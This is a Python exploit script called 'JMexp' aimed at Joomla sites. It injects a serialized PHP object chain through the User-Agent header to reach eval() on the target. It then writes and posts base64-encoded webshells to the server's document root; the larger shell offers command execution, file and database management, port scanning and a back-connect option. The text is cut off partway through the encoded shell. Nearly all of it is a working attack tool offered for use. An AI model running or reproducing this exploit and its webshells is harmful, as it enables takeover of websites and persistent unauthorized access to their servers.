# !/usr/bin/python
# coding=utf-8
# thanks for nlfox
# fixed by evil7
# 2015/12/16

import urllib
import re
import os
__author__ = 'nlfox233'
import urllib2
import cookielib
import sys

site = sys.argv[1]

os.system('clear')
print "     _ __  __"
print "    | |  \/  | _____  ___ __"
print " _  | | |\/| |/ _ \ \/ / '_ \\"
print "| |_| | |  | |  __/>  <| |_) |"
print " \___/|_|  |_|\___/_/\_\ .__/"
print "                       |_|   v:2015.12.16"
print ""
print "  >> JMexp running..."

code = "file_put_contents($_SERVER['DOCUMENT_ROOT'].'/JMexp.php',base64_decode('PD9waHAgaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGY4Iik7IGlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpIGZvcmVhY2goJF9QT1NUIGFzICRrPT4kdikgJF9QT1NUWyRrXSA9IHN0cmlwc2xhc2hlcygkdik7Pz48P3BocCBAZXZhbCgkX1BPU1RbJ0pNZXhwJ10pOz8+IA0KPGNlbnRlcj4NCklGIFVwZGF0ZSBXZWJzaGVsbCBOb3QgU3VlY2Nlc3MuPGJyPg0KWW91IENhbiBVcGxvYWQgRmlsZSBCeSBZb3VzZWxmLiA8YnI+DQpPciBVc2UgMUNvZGVTaGVsbCBXaXRoIFRoaXMgV2Vic2hlbGwuPGJyPg0KMUNvZGU6IEpNZXhwPGJyPjxicj4NCjxmb3JtIG1ldGhvZD0iUE9TVCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJTYXZlX2l0Ij46PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUiIHNpemU9IjYwIiB2YWx1ZT0iPD9waHAgZWNobyBfX0ZJTEVfXzs/PiI+IA0KPGJyPjxicj4gDQo8dGV4dGFyZWEgbmFtZT0idGV4dCIgQ09MUz0iNzAiIFJPV1M9IjE4Ij48L3RleHRhcmVhPiANCjxmb3JtPg0KPC9jZW50ZXI+DQo8P3BocCBpZihpc3NldCgkX1BPU1RbJ3RleHQnXSkpeyRmcCA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwnd2InKTtlY2hvIEBmd3JpdGUoJGZwLCRfUE9TVFsndGV4dCddKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWydKTWRhdGEnXSkpeyRmcCA9IEBmb3BlbiggX19GSUxFX18sJ3diJyk7ZWNobyBAZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRfUE9TVFsnSk1kYXRhJ10pKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg=='))"

url = site + '?1=' + urllib.quote("@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + ";echo '|<-';")
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)
urllib2.socket.setdefaulttimeout(10)

ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
req = urllib2.Request(url=url, headers={'User-Agent': ua})
opener.open(req)
req = urllib2.Request(url=url)
res = opener.open(req).read()

# Post New Webshell

print ""
print "  >> Upload Webshell..."

JMurl = site + '/JMexp.php'
JMdata = "PD9waHAKLy9pbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMSk7CkBlcnJvcl9yZXBvcnRpbmcoNyk7CkBzZXNzaW9uX3N0YXJ0KCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKaWYoIHN0cnBvcyggc3RydG9sb3dlciggJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddICksICdib3QnICkgIT09IGZhbHNlICkgewoJaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7CglleGl0Owp9Cm9iX3N0YXJ0KCk7CiRtdGltZSA9IGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSk7CiRzdGFydHRpbWUgPSAkbXRpbWVbMV0gKyAkbXRpbWVbMF07CmRlZmluZSgnU0FfUk9PVCcsIHN0cl9yZXBsYWNlKCdcXCcsICcvJywgZGlybmFtZShfX0ZJTEVfXykpLicvJyk7CmRlZmluZSgnU0VMRicsICRfU0VSVkVSWydQSFBfU0VMRiddID8gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gOiAkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSk7CmRlZmluZSgnSVNfV0lOJywgRElSRUNUT1JZX1NFUEFSQVRPUiA9PSAnXFwnKTsKZGVmaW5lKCdJU19HUEMnLCBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKTsKJGRpc19mdW5jID0gZ2V0X2NmZ192YXIoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CmRlZmluZSgnSVNfUEhQSU5GTycsICghZXJlZ2koInBocGluZm8iLCRkaXNfZnVuYykpID8gMSA6IDAgKTsKCmlmKCBJU19HUEMgKSB7IAoJJF9QT1NUID0gc19hcnJheSgkX1BPU1QpOwp9CiRQID0gJF9QT1NUOwp1bnNldCgkX1BPU1QpOwoKJHBhc3MgID0gJyc7CiRjb29raWVkb21haW4gPSAnJzsKJGNvb2tpZXBhdGggPSAnLyc7CiRjb29raWVsaWZlID0gODY0MDA7CiRjaGFyc2V0ZGIgPSBhcnJheSgKCSdiaWc1JwkJCT0+ICdiaWc1JywKCSdjcC04NjYnCQk9PiAnY3A4NjYnLAoJJ2V1Yy1qcCcJCT0+ICd1amlzJywKCSdldWMta3InCQk9PiAnZXVja3InLAoJJ2diaycJCQk9PiAnZ2JrJywKCSdpc28tODg1OS0xJwk9PiAnbGF0aW4xJywKCSdrb2k4LXInCQk9PiAna29pOHInLAoJJ2tvaTgtdScJCT0+ICdrb2k4dScsCgkndXRmLTgnCQkJPT4gJ3V0ZjgnLAoJJ3dpbmRvd3MtMTI1MicJPT4gJ2xhdGluMScsCik7CiRhY3QgPSBpc3NldCgkUFsnYWN0J10pID8gJFBbJ2FjdCddIDogJyc7CiRjaGFyc2V0ID0gaXNzZXQoJFBbJ2NoYXJzZXQnXSkgPyAkUFsnY2hhcnNldCddIDogJ2diayc7CiRkb2luZyA9IGlzc2V0KCRQWydkb2luZyddKSA/ICRQWydkb2luZyddIDogJyc7CmZvciAoJGk9MTskaTw9NDskaSsrKSB7CgkkeydwJy4kaX0gPSBpc3NldCgkUFsncCcuJGldKSA/ICRQWydwJy4kaV0gOiAnJzsKfQppZiAoaXNzZXQoJGNoYXJzZXRkYlskY2hhcnNldF0pKSB7CgloZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PSIuJGNoYXJzZXQpOwp9CiR0aW1lc3RhbXAgPSB0aW1lKCk7CmlmICgkYWN0ID09ICJsb2dvdXQiKSB7CglzY29va2llKCdsb2dpbnBhc3MnLCAnJywgLTg2NDAwICogMzY1KTsKCUBoZWFkZXIoJ0xvY2F0aW9uOiAnLlNFTEYpOwoJZXhpdDsKfQppZigkcGFzcykgewoJaWYgKCRhY3QgPT0gJ2xvZ2luJykgewoJCWlmICgkcGFzcyA9PSBlbmNvZGVfcGFzcygkUFsncGFzc3dvcmQnXSkpIHsKCQkJc2Nvb2tpZSgnbG9naW5wYXNzJyxlbmNvZGVfcGFzcygkUFsncGFzc3dvcmQnXSkpOwoJCQlAaGVhZGVyKCdMb2NhdGlvbjogJy5TRUxGKTsKCQkJZXhpdDsKCQl9Cgl9CglpZiAoaXNzZXQoJF9DT09LSUVbJ2xvZ2lucGFzcyddKSkgewoJCWlmICgkX0NPT0tJRVsnbG9naW5wYXNzJ10gIT0gJHBhc3MpIHsKCQkJbG9naW5wYWdlKCk7CgkJfQoJfSBlbHNlIHsKCQlsb2dpbnBhZ2UoKTsKCX0KfQokZXJybXNnID0gJyc7CiR1Y2hhciA9ICcmIzk2NTA7JzsKJGRjaGFyID0gJyYjOTY2MDsnOwohJGFjdCAmJiAkYWN0ID0gJ2ZpbGUnOwokaG9tZV9jd2QgPSBnZXRjd2QoKTsKaWYgKGlzc2V0KCRQWydjd2QnXSkgJiYgJFBbJ2N3ZCddKSB7CgljaGRpcigkUFsnY3dkJ10pOwp9IGVsc2UgewoJY2hkaXIoU0FfUk9PVCk7Cn0KJGN3ZCA9IGdldGN3ZCgpOwokd2ViX2N3ZCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CmZvcmVhY2ggKGFycmF5KCd3ZWJfY3dkJywnY3dkJywnaG9tZV9jd2QnKSBhcyAkaykgewoJaWYgKElTX1dJTikgewoJCSQkayA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJCRrKTsKCX0KCWlmIChzdWJzdHIoJCRrLCAtMSkgIT0gJy8nKSB7CgkJJCRrID0gJCRrLicvJzsKCX0KfQppZiAoJGFjdCA9PSAncGhwaW5mbycpIHsKCWlmIChJU19QSFBJTkZPKSB7CgkJcGhwaW5mbygpOwoJCWV4aXQ7Cgl9IGVsc2UgewoJCSRlcnJtc2cgPSAncGhwaW5mbygpIGZ1bmN0aW9uIGhhcyBkaXNhYmxlZCc7Cgl9Cn0KCmlmKCFmdW5jdGlvbl9leGlzdHMoJ3NjYW5kaXInKSkgewoJZnVuY3Rpb24gc2NhbmRpcigkY3dkKSB7CgkJJGZpbGVzID0gYXJyYXkoKTsKCQkkZGggPSBvcGVuZGlyKCRjd2QpOwoJCXdoaWxlICgkZmlsZSA9IHJlYWRkaXIoJGRoKSkgewoJCQkkZmlsZXNbXSA9ICRmaWxlOwoJCX0KCQlyZXR1cm4gJGZpbGVzID8gJGZpbGVzIDogMDsKCX0KfQoKaWYgKCRhY3QgPT0gJ2Rvd24nKSB7CglpZiAoaXNfZmlsZSgkcDEpICYmIGlzX3JlYWRhYmxlKCRwMSkpIHsKCQlAb2JfZW5kX2NsZWFuKCk7CgkJJGZpbGVpbmZvID0gcGF0aGluZm8oJHAxKTsKCQlpZiAoZnVuY3Rpb25fZXhpc3RzKCdtaW1lX2NvbnRlbnRfdHlwZScpKSB7CgkJCSR0eXBlID0gQG1pbWVfY29udGVudF90eXBlKCRwMSk7CgkJCWhlYWRlcigiQ29udGVudC1UeXBlOiAiLiR0eXBlKTsKCQl9IGVsc2UgewoJCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC0nLiRmaWxlaW5mb1snZXh0ZW5zaW9uJ10pOwoJCX0KCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPScuJGZpbGVpbmZvWydiYXNlbmFtZSddKTsKCQloZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnLnNwcmludGYoIiV1IiwgQGZpbGVzaXplKCRwMSkpKTsKCQlAcmVhZGZpbGUoJHAxKTsKCQlleGl0OwoJfSBlbHNlIHsKCQkkZXJybXNnID0gJ0NhblwndCByZWFkIGZpbGUnOwoJCSRhY3QgPSAnZmlsZSc7Cgl9Cn0KPz4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD08P3BocCBlY2hvICRjaGFyc2V0Oz8+Ij4KPHRpdGxlPjw/cGhwIGVjaG8gJGFjdC4nIC0gJy4kX1NFUlZFUlsnSFRUUF9IT1NUJ107Pz48L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5LHRke2ZvbnQ6IDEycHggQXJpYWwsVGFob21hO2xpbmUtaGVpZ2h0OiAxNnB4O30KLmlucHV0LCBzZWxlY3R7Zm9udDoxMnB4IEFyaWFsLFRhaG9tYTtiYWNrZ3JvdW5kOiNmZmY7Ym9yZGVyOiAxcHggc29saWQgIzY2NjtwYWRkaW5nOjJweDtoZWlnaHQ6MjJweDt9Ci5hcmVhe2ZvbnQ6MTJweCAnQ291cmllciBOZXcnLCBNb25vc3BhY2U7YmFja2dyb3VuZDojZmZmO2JvcmRlcjogMXB4IHNvbGlkICM2NjY7cGFkZGluZzoycHg7fQoucmVke2NvbG9yOiNmMDA7fQouYmxhY2t7Y29sb3I6IzAwMDt9Ci5ncmVlbntjb2xvcjojMDkwO30KLmJ7Zm9udC13ZWlnaHQ6Ym9sZDt9Ci5idCB7Ym9yZGVyLWNvbG9yOiNiMGIwYjA7YmFja2dyb3VuZDojM2QzZDNkO2NvbG9yOiNmZmY7Zm9udDoxMnB4IEFyaWFsLFRhaG9tYTtoZWlnaHQ6MjJweDt9CmEge2NvbG9yOiAjMDBmO3RleHQtZGVjb3JhdGlvbjpub25lO30KYTpob3Zlcntjb2xvcjogI2YwMDt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lO30KLmFsdDEgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgI2ZmZjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZGRkO2JhY2tncm91bmQ6I2YxZjFmMTtwYWRkaW5nOjVweCAxNXB4IDVweCA1cHg7fQouYWx0MiB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZjlmOWY5O3BhZGRpbmc6NXB4IDE1cHggNXB4IDVweDt9Ci5mb2N1cyB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7YmFja2dyb3VuZDojZmZhO3BhZGRpbmc6NXB4IDE1cHggNXB4IDVweDt9Ci5oZWFkIHRke2JvcmRlci10b3A6MXB4IHNvbGlkICNmZmY7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2RkZDtiYWNrZ3JvdW5kOiNlOWU5ZTk7cGFkZGluZzo1cHggMTVweCA1cHggNXB4O2ZvbnQtd2VpZ2h0OmJvbGQ7fQouaGVhZCB0ZCBzcGFue2ZvbnQtd2VpZ2h0Om5vcm1hbDt9Ci5pbmZvbGlzdCB7cGFkZGluZzoxMHB4O21hcmdpbjoxMHB4IDAgMjBweCAwO2JhY2tncm91bmQ6I0YxRjFGMTtib3JkZXI6MXB4IHNvbGlkICNkZGQ7fQpmb3Jte21hcmdpbjowO3BhZGRpbmc6MDt9Cmgye21hcmdpbjowO3BhZGRpbmc6MDtoZWlnaHQ6MjRweDtsaW5lLWhlaWdodDoyNHB4O2ZvbnQtc2l6ZToxNHB4O2NvbG9yOiM1QjY4NkY7fQp1bC5pbmZvIGxpe21hcmdpbjowO2NvbG9yOiM0NDQ7bGluZS1oZWlnaHQ6MjRweDtoZWlnaHQ6MjRweDt9CnV7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9yOiM3Nzc7ZmxvYXQ6bGVmdDtkaXNwbGF5OmJsb2NrO3dpZHRoOjE1MHB4O21hcmdpbi1yaWdodDoxMHB4O30KLmRyaXZlc3twYWRkaW5nOjVweDt9Ci5kcml2ZXMgc3BhbiB7bWFyZ2luOmF1dG8gN3B4O30KPC9zdHlsZT4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpmdW5jdGlvbiBjaGVja2FsbChmb3JtKSB7Cglmb3IodmFyIGk9MDtpPGZvcm0uZWxlbWVudHMubGVuZ3RoO2krKykgewoJCXZhciBlID0gZm9ybS5lbGVtZW50c1tpXTsKICAgICAgICBpZiAoZS50eXBlID09ICdjaGVja2JveCcpIHsKCQkJaWYgKGUubmFtZSAhPSAnY2hrYWxsJyAmJiBlLm5hbWUgIT0gJ3NhdmVhc2ZpbGUnKQoJCQkJZS5jaGVja2VkID0gZm9ybS5jaGthbGwuY2hlY2tlZDsKCQl9CiAgICB9Cn0KZnVuY3Rpb24gJChpZCkgewoJcmV0dXJuIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKTsKfQpmdW5jdGlvbiBjcmVhdGVkaXIoKXsKCXZhciBuZXdkaXJuYW1lOwoJbmV3ZGlybmFtZSA9IHByb21wdCgnUGxlYXNlIGlucHV0IHRoZSBkaXJlY3RvcnkgbmFtZTonLCAnJyk7CglpZiAoIW5ld2Rpcm5hbWUpIHJldHVybjsKCWcobnVsbCxudWxsLCdjcmVhdGVkaXInLG5ld2Rpcm5hbWUpOwp9CmZ1bmN0aW9uIGZpbGVwZXJtKHBmaWxlLCB2YWwpewoJdmFyIG5ld3Blcm07CgluZXdwZXJtID0gcHJvbXB0KCdDdXJyZW50IGRpci9maWxlOicrcGZpbGUrJ1xuUGxlYXNlIGlucHV0IG5ldyBwZXJtaXNzaW9uczonLCB2YWwpOwoJaWYgKCFuZXdwZXJtKSByZXR1cm47CglnKG51bGwsbnVsbCwnZmlsZXBlcm0nLHBmaWxlLG5ld3Blcm0pOwp9CmZ1bmN0aW9uIHJlbmFtZShvbGRuYW1lKXsKCXZhciBuZXdmaWxlbmFtZTsKCW5ld2ZpbGVuYW1lID0gcHJvbXB0KCdGaWxlbmFtZTonK29sZG5hbWUrJ1xuUGxlYXNlIGlucHV0IG5ldyBmaWxlbmFtZTonLCAnJyk7CglpZiAoIW5ld2ZpbGVuYW1lKSByZXR1cm47CglnKG51bGwsbnVsbCwncmVuYW1lJyxuZXdmaWxlbmFtZSxvbGRuYW1lKTsKfQpmdW5jdGlvbiBjcmVhdGVmaWxlKCl7Cgl2YXIgZmlsZW5hbWU7CglmaWxlbmFtZSA9IHByb21wdCgnUGxlYXNlIGlucHV0IHRoZSBmaWxlIG5hbWU6JywgJycpOwoJaWYgKCFmaWxlbmFtZSkgcmV0dXJuOwoJZygnZWRpdGZpbGUnLCBudWxsLCBudWxsLCBmaWxlbmFtZSk7Cn0KZnVuY3Rpb24gc2V0ZGIoZGJuYW1lKSB7CglpZighZGJuYW1lKSByZXR1cm47CgkkKCdkYmZvcm0nKS50YWJsZW5hbWUudmFsdWU9Jyc7CgkkKCdkYmZvcm0nKS5kb2luZy52YWx1ZT0nJzsKCWlmICgkKCdkYmZvcm0nKS5zcWxfcXVlcnkpCgl7CgkJJCgnZGJmb3JtJykuc3FsX3F1ZXJ5LnZhbHVlPScnOwoJfQoJJCgnZGJmb3JtJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gc2V0c29ydChrKSB7CgkkKCdkYmZvcm0nKS5vcmRlci52YWx1ZT1rOwoJJCgnZGJmb3JtJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gc2V0dGFibGUodGFibGVuYW1lLGRvaW5nKSB7CglpZighdGFibGVuYW1lKSByZXR1cm47CglpZiAoZG9pbmcpIHsKCQkkKCdkYmZvcm0nKS5kb2luZy52YWx1ZT1kb2luZzsKCX0gZWxzZSB7CgkJJCgnZGJmb3JtJykuZG9pbmcudmFsdWU9Jyc7Cgl9CgkkKCdkYmZvcm0nKS5zcWxfcXVlcnkudmFsdWU9Jyc7CgkkKCdkYmZvcm0nKS50YWJsZW5hbWUudmFsdWU9dGFibGVuYW1lOwoJJCgnZGJmb3JtJykuc3VibWl0KCk7Cn0KZnVuY3Rpb24gcyhhY3QsY3dkLHAxLHAyLHAzLHA0LGNoYXJzZXQpIHsKCWlmKGFjdCAhPSBudWxsKSAkKCdvcGZvcm0nKS5hY3QudmFsdWU9YWN0OwoJaWYoY3dkICE9IG51bGwpICQoJ29wZm9ybScpLmN3ZC52YWx1ZT1jd2Q7CglpZihwMSAhPSBudWxsKSAkKCdvcGZvcm0nKS5wMS52YWx1ZT1wMTsKCWlmKHAyICE9IG51bGwpICQoJ29wZm9ybScpLnAyLnZhbHVlPXAyOwoJaWYocDMgIT0gbnVsbCkgJCgnb3Bmb3JtJykucDMudmFsdWU9cDM7CglpZihwNCAhPSBudWxsKSB7JCgnb3Bmb3JtJykucDQudmFsdWU9cDQ7fWVsc2V7JCgnb3Bmb3JtJykucDQudmFsdWU9Jyc7fQoJaWYoY2hhcnNldCAhPSBudWxsKSAkKCdvcGZvcm0nKS5jaGFyc2V0LnZhbHVlPWNoYXJzZXQ7Cn0KZnVuY3Rpb24gZyhhY3QsY3dkLHAxLHAyLHAzLHA0LGNoYXJzZXQpIHsKCXMoYWN0LGN3ZCxwMSxwMixwMyxwNCxjaGFyc2V0KTsKCSQoJ29wZm9ybScpLnN1Ym1pdCgpOwp9Cjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5IHN0eWxlPSJtYXJnaW46MDt0YWJsZS1sYXlvdXQ6Zml4ZWQ7IHdvcmQtYnJlYWs6YnJlYWstYWxsIj4KPD9waHAKCmZvcm1oZWFkKGFycmF5KCduYW1lJz0+J29wZm9ybScpKTsKbWFrZWhpZGUoJ2FjdCcsICRhY3QpOwptYWtlaGlkZSgnY3dkJywgJGN3ZCk7Cm1ha2VoaWRlKCdwMScsICRwMSk7Cm1ha2VoaWRlKCdwMicsICRwMik7Cm1ha2VoaWRlKCdwMycsICRwMyk7Cm1ha2VoaWRlKCdwNCcsICRwNCk7Cm1ha2VoaWRlKCdjaGFyc2V0JywgJGNoYXJzZXQpOwpmb3JtZm9vdCgpOwoKaWYoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKSB7CgkkdXNlciA9IEBnZXRfY3VycmVudF91c2VyKCk7CgkkdWlkID0gQGdldG15dWlkKCk7CgkkZ2lkID0gQGdldG15Z2lkKCk7CgkkZ3JvdXAgPSAiPyI7Cn0gZWxzZSB7CgkkdWlkID0gQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOwoJJGdpZCA9IEBwb3NpeF9nZXRncmdpZChAcG9zaXhfZ2V0ZWdpZCgpKTsKCSR1aWQgPSAkdWlkWyd1aWQnXTsKCSR1c2VyID0gJHVpZFsnbmFtZSddOwoJJGdpZCA9ICRnaWRbJ2dpZCddOwoJJGdyb3VwID0gJGdpZFsnbmFtZSddOwp9Cj8+Cjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPgoJPHRyIGNsYXNzPSJoZWFkIj4KCQk8dGQ+PHNwYW4gc3R5bGU9ImZsb2F0OnJpZ2h0OyI+PD9waHAgZWNobyBAcGhwX3VuYW1lKCk7Pz4gLyBVc2VyOjw/cGhwIGVjaG8gJHVpZC4nICggJy4kdXNlci4nICkgLyBHcm91cDogJy4kZ2lkLicgKCAnLiRncm91cC4nICknOz8+PC9zcGFuPjw/cGhwIGVjaG8gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOz8+ICg8P3BocCBlY2hvIGdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pOz8+KTwvdGQ+Cgk8L3RyPgoJPHRyIGNsYXNzPSJhbHQxIj4KCQk8dGQ+CgkJCTxzcGFuIHN0eWxlPSJmbG9hdDpyaWdodDsiPkNoYXJzZXQ6CgkJCTw/cGhwCgkJCW1ha2VzZWxlY3QoYXJyYXkoJ25hbWUnPT4nY2hhcnNldCcsJ29wdGlvbic9PiRjaGFyc2V0ZGIsJ3NlbGVjdGVkJz0+JGNoYXJzZXQsJ29uY2hhbmdlJz0+J2cobnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsdGhpcy52YWx1ZSk7JykpOwoJCQk/PgoJCQk8L3NwYW4+CgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6ZygnbG9nb3V0Jyk7Ij5Mb2dvdXQ8L2E+IHwgCgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6ZygnZmlsZScsbnVsbCwnJywnJywnJywnJywnPD9waHAgZWNobyAkY2hhcnNldDs/PicpOyI+RmlsZSBNYW5hZ2VyPC9hPiB8IAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ215c3FsYWRtaW4nLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPk1ZU1FMIE1hbmFnZXI8L2E+IHwgCgkJCTxhIGhyZWY9ImphdmFzY3JpcHQ6Zygnc2hlbGwnLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPkV4ZWN1dGUgQ29tbWFuZDwvYT4gfCAKCQkJPGEgaHJlZj0iamF2YXNjcmlwdDpnKCdwaHBlbnYnLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPlBIUCBWYXJpYWJsZTwvYT4gfCAKCQkJPGEgaHJlZj0iamF2YXNjcmlwdDpnKCdwb3J0c2NhbicsbnVsbCwnJywnJywnJywnJywnPD9waHAgZWNobyAkY2hhcnNldDs/PicpOyI+UG9ydCBTY2FuPC9hPiB8IAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ3NlY2luZm8nLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPlNlY3VyaXR5IGluZm9ybWF0aW9uPC9hPiB8IAoJCQk8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ2V2YWwnLG51bGwsJycsJycsJycsJycsJzw/cGhwIGVjaG8gJGNoYXJzZXQ7Pz4nKTsiPkV2YWwgUEhQIENvZGU8L2E+CgkJCTw/cGhwIGlmICghSVNfV0lOKSB7Pz4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OmcoJ2JhY2tjb25uZWN0JyxudWxsLCcnLCcnLCcnLCcnLCc8P3BocCBlY2hvICRjaGFyc2V0Oz8+Jyk7Ij5CYWNrIENvbm5lY3Q8L2E+PD9waHAgfT8+CgkJPC90ZD4KCTwvdHI+CjwvdGFibGU+Cjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMTUiIGNlbGxzcGFjaW5nPSIwIj48dHI+PHRkPgo8P3BocAokZXJybXNnICYmIG0oJGVycm1zZyk7CgppZiAoJGFjdCA9PSAnZmlsZScpIHsKCSRkaXJfd3JpdGVhYmxlID0gQGlzX3dyaXRhYmxlKCRjd2QpID8gJ1dyaXRhYmxlJyA6ICdOb24td3JpdGFibGUnOwoJaWYgKGlzc2V0KCRwMSkpIHsKCQlzd2l0Y2goJHAxKSB7CgkJCWNhc2UgJ2NyZWF0ZWRpcic6CgkJCQlpZiAoJHAyKSB7CgkJCQkJbSgnRGlyZWN0b3J5IGNyZWF0ZWQgJy4oQG1rZGlyKCRjd2QuJHAyLDA3NzcpID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQljYXNlICd1cGxvYWRGaWxlJzoKCQkJCW0oJ0ZpbGUgdXBsb2FkICcuKEBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXBsb2FkZmlsZSddWyd0bXBfbmFtZSddLCAkY3dkLicvJy4kX0ZJTEVTWyd1cGxvYWRmaWxlJ11bJ25hbWUnXSkgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCQkJYnJlYWs7CgkJCWNhc2UgJ2ZpbGVwZXJtJzoKCQkJCWlmICgkcDIgJiYgJHAzKSB7CgkJCQkJJHAzID0gYmFzZV9jb252ZXJ0KCRwMywgOCwgMTApOwoJCQkJCW0oJ1NldCBmaWxlIHBlcm1pc3Npb25zICcuKEBjaG1vZCgkcDIsICRwMykgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3JlbmFtZSc6CgkJCQlpZiAoJHAyICYmICRwMykgewoJCQkJCW0oJHAzLicgcmVuYW1lZCAnLiRwMi4oQHJlbmFtZSgkcDMsICRwMikgPyAnIHN1Y2Nlc3MnIDogJyBmYWlsZWQnKSk7CgkJCQl9CgkJCQlicmVhazsKCQkJY2FzZSAnY2xvbmV0aW1lJzoKCQkJCWlmICgkcDIgJiYgJHAzKSB7CgkJCQkJJHRpbWUgPSBAZmlsZW10aW1lKCRwMyk7CgkJCQkJbSgnU2V0IGZpbGUgbGFzdCBtb2RpZmllZCAnLihAdG91Y2goJHAyLCR0aW1lLCR0aW1lKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJCQl9CgkJCQlicmVhazsKCQkJY2FzZSAnc2V0dGltZSc6CgkJCQlpZiAoJHAyICYmICRwMykgewoJCQkJCSR0aW1lID0gc3RydG90aW1lKCRwMyk7CgkJCQkJbSgnU2V0IGZpbGUgbGFzdCBtb2RpZmllZCAnLihAdG91Y2goJHAyLCR0aW1lLCR0aW1lKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJCQl9CgkJCQlicmVhazsKCQkJY2FzZSAnZGVsZXRlJzoKCQkJCWlmICgkUFsnZGwnXSkgewoJCQkJCSRzdWNjID0gJGZhaWwgPSAwOwoJCQkJCWZvcmVhY2ggKCRQWydkbCddIGFzICRmKSB7CgkJCQkJCWlmIChpc19kaXIoJGN3ZC4kZikpIHsKCQkJCQkJCW